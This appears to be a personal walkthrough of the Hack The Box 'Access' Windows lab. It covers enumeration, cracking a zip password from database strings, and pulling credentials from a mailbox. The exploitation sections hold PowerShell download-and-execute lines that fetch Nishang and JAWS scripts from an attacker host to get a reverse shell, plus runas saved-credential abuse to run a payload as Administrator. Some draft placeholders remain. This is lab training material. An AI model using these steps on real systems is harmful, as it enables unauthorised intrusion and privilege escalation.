# HTB/THM : Name


```toc
```

---
---
---
---

## Machine Information

| Contents      | Description                          |
| ------------- | ------------------------------------ |
| Name          | HTB : Access                         |
| Difficulty    | Easy                                 |
| OS            | Windows                              |
| Shell_Exploit | Windows Access DB + Clear Text Creds |
| Priv_Esc      | Credentials Stored in dpAPI + RunAS **OR** Mimikatz                           |
| Miscellaneous | ----                                 |


---
---
---


## Scanning
### Nmap

> 2 ports are open
> > ![[Pasted image 20221108010550.png]]
> > 

---
---

## Enumeration
### Web Browser 

#### a. robots.txt
> Nothing

#### b. source code
> ![[Pasted image 20221108135333.png]]

#### c. basic website enumerations/Spidering

#### d. searchsploit/online Databases
> Nothing

#### e. Gobuster Scan
> Only one Directory
> > ![[Pasted image 20221108135456.png]]

#### f. Other Enumerations
> ***FTP***
> > ![[Pasted image 20221108135748.png]]
> > - We have to Directories; lets switch to **binary mode** and download them
> > - 


---
---

## Exploit

### a. Attack Vector
> As we know there is no other way; so going through thses filse might be the only way.
> `strings filename` 
> > ![[Pasted image 20221108140119.png]]
> 
> `7zip l -slt file.zip`
> > ![[Pasted image 20221108211655.png]]
> > - Not much information, the file is protected using AES-256, so lets try bruteforcing using zip2john
> > - `zip2john file.zip access-control.hash`
> 
> Now lets try to extract the password for this file. there are 2 ways to do it. One is easy and logical and the other one is straight forward enumeration
> ***Method 1***
> - First use strings command to get the infromations in the *backup.mdb* file
> > `strings backup.mdb`
> 
> - No save the result to a text file and name it wordlist.txt; this might contain the password for the *zip file*
> > `strings backup.mdb > wordlist.txt`
> 
> - Now use this wordlist against the zip2john hash file using johntheripper
> > `john --wordlist=wordlist.txt access-control.hash`
> > > ![[Pasted image 20221109224120.png]]
> 
> ***Method-2***
> - `mdb-sql <filename.mdb>`
> - `list tables`
> - `go`
> > ![[Pasted image 20221109224616.png]]
> 
> - `mdb-tables <file.mdb>` This servers the same purpose as above but its useful for the user to pipe.
> - `for i in $(mdb-tables backup.mdb); do echo $i; done > list-of-tables.txt`
> > ![[Pasted image 20221109225145.png]]
> 
> - `mdb-export backup.mdb auth_user` --> (suspiecious table_NAME)
> > ![[Pasted image 20221109225421.png]]
> 
> This could be your actual route, the long way.
> - `mkdir tables`
> - `for i in $(mdb-tables backup.mdb); do mdb-export backup.mdb $i > tables/$i; done`
> - `cd tables`
> > ![[Pasted image 20221109225703.png]]
> 
> now you have the password so go extract the **zip file**
> You will get a **.pst file**; use **readpts** command to open it
> - `readpts <filename.pst>`
> - `cat "access control.mbox | grep password"`
> > ![[Pasted image 20221108214348.png]]
> 
> More graphical way of getting the credentials using MS Access
> > ![[Pasted image 20221108151547.png]]
> 
> Getting the password via outlook
> > ![[Pasted image 20221109230358.png]]

### b. Mode of Attack
> Now that you get the Passwords; just TELNET iinto thevictim with the found creds.
> > `telnet 10.10.10.98` and give the *username* and *password*
> 
> To change the shell to a good tty shell
> > ***Attacker***
> > > `cd pwd`
> > > `cp /opt/nishang/Shells/Invoke-PowerShellTcp.ps1 .`
> > > `mv Invoke-PowerShellTcp.ps1 nishang.ps1`
> 
> > ***Target***
> > > `powershell "IEX(New-Object Net.WebClient).downloadString('http://attacker_IP:PORT/nishang.ps1')"`
> > > - Thats it you ll get a reverse powershell.
>
> > **OR**
> >  
> > ***Attacker***
> > > `nc -lvnp port`
> > > `msfvenom asdasd`
> > > **OR**
> > > `msfvenom -p `
> > 
> > ***Target***  --> Executing a Powershell Command in Command Prompt
> > > `C:\> powershell [-noexit] -executionpolicy bypass/Unrestricted -File <Filename>`
> > > `C:\> PowerShell.exe -command "C:\temp\TestPS.ps1"`
> > > `C:\> PowerShell.exe Invoke-Command -ScriptBlock { "C:\temp\TestPS.ps1"}`
> > > `C:\> PowerShell.exe -ExecutionPolicy Unrestricted -command "C:\temp\TestPS.ps1"`


> User key
> > ![[Pasted image 20221109205501.png]]

---
---

## Priv_Esc

### a. Attack Vector
> We first find the vul'n; either manually or using any automatic script
> > ***Attacker***
> > - `nc -lvnp port`
> > - `cp /opt/JAWS/jaws-enum.ps1 <pwd>`
> > - `mv jaws-enum.ps1 jaws.ps1`
> > - `python -m http.server`
> > 
> > ***Target***
> > - `powershell "IEX(New-Object Net.WebClient).downloadString('http://attacker_IP:PORT/jaws.ps1')"`
> > - **OR Simply run the following** 
> > - `cmdkey /list`  --> Jaws.ps1 runs this command and finds the result automatically, you can do it manually as well.
> > 
> > > ![[Pasted image 20221109213058.png]]

### b. Mode of Attack

> Exploiting the **RunAs vul'n**
> > `where cmd.exe`
> > `where runas`
> > `C:\Windows\System32\runas.exe /user:ACCESS\Administrator /save:cred "C:\Windows\System32\cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"`
>  
> OR Simply run the above command wothout the full paths of the binaries *runas.exe* and *cmd.exe* instead just give *runas* and *cmd*
> 
> > `runas /user:ACCESS\Administrator /save:cred "cmd.exe /c type C:\Users\Administrator\Desktop\root.txt > C:\Users\security\Desktop\root.txt"`
> > 
> > > ![[Pasted image 20221109221213.png]]

> Use the vul'n to spawn a revese shell since its running with Admin privs, you will get a admin shell
> > `runas /user:ACCESS\Administrator /save:cred "cmd.exe /c C:\Users\path\to\payload.bat"`
> > > ![[Pasted image 20221109221921.png]]
> > > ![[Pasted image 20221109215654.png]]


